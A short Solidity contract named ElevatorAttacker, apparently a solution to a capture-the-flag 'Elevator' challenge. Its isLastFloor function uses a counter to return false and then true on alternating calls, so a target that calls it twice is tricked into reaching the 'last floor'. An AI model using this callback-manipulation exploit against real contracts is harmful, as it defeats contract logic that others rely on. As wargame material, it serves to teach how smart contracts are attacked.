// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElevatorAttacker {
    uint256 private counter;

    function isLastFloor(uint256 /*_floor*/) external returns (bool) {
        bool isLast = false;

        if (counter % 2 == 1) {
            isLast = true;
        }

        counter = counter + 1;

        return isLast;
    }
}
